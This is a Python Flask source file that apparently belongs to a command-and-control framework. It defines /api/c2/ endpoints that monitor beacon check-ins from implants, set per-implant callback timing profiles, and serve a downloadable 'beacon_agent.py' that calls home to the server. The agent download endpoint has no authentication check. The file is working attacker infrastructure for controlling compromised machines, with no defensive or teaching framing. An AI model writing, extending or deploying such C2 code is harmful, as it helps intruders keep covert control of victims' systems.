"""beacon blueprint (P15.4 -- additive beacon monitor API).

ADD-ONLY endpoints (NR-2).  Observe REAL beacon arrivals, choose a timing
profile, and fetch a server-driven agent that honours ``next_interval_ms``.
"""
from __future__ import annotations

import os

from flask import Blueprint, Response, jsonify, request, session

from app.exec import beacon
from app.state import BASE_DIR

bp = Blueprint("beacon", __name__,
               template_folder=os.path.join(BASE_DIR, "flask_templates"))

_UNSET = object()


def _guard():
    if 'IAm-logined' not in session:
        return jsonify({'error': 'Not authenticated'}), 401
    return None


@bp.route('/api/c2/beacons')
def api_beacons():
    bad = _guard()
    if bad:
        return bad
    return jsonify({'profile': beacon.CONFIG.default(), 'profiles': beacon.profiles(),
                    'base_ms': beacon.CONFIG.base_ms(),
                    'beacons': beacon.TRACKER.all_stats()})


@bp.route('/api/c2/beacons/<uid>')
def api_beacon_detail(uid):
    bad = _guard()
    if bad:
        return bad
    return jsonify({'profile': beacon.CONFIG.for_uid(uid),
                    'stats': beacon.TRACKER.stats(uid),
                    'timeline': beacon.TRACKER.timeline(uid)})


@bp.route('/api/c2/beacon_config', methods=['POST'])
def api_beacon_config():
    bad = _guard()
    if bad:
        return bad
    data = request.json or {}
    profile = data.get('profile')
    base_ms = data.get('base_ms', _UNSET)
    if not profile and base_ms is _UNSET:
        return jsonify({'error': 'profile or base_ms required',
                        'profiles': beacon.profiles()}), 400
    try:
        if profile:
            if data.get('uid'):
                beacon.CONFIG.set_for(data['uid'], profile)
            else:
                beacon.CONFIG.set_default(profile)
        if base_ms is not _UNSET:
            beacon.CONFIG.set_base_ms(base_ms)
    except ValueError as exc:
        return jsonify({'error': str(exc), 'profiles': beacon.profiles()}), 400
    return jsonify({'status': 'ok', 'profile': profile or beacon.CONFIG.default(),
                    'base_ms': beacon.CONFIG.base_ms(), 'uid': data.get('uid'),
                    'profiles': beacon.profiles()})


@bp.route('/api/c2/beacon_agent')
def api_beacon_agent():
    """A drop-in agent that sleeps for the server's ``next_interval_ms``."""
    base = request.args.get('base') or request.host_url.rstrip('/')
    uid = request.args.get('uid') or 'beacon-agent'
    body = beacon.agent_script(base, uid)
    if request.args.get('download'):
        return Response(body, mimetype='text/plain',
                        headers={'Content-Disposition': 'attachment; filename=beacon_agent.py'})
    return Response(body, mimetype='text/plain')
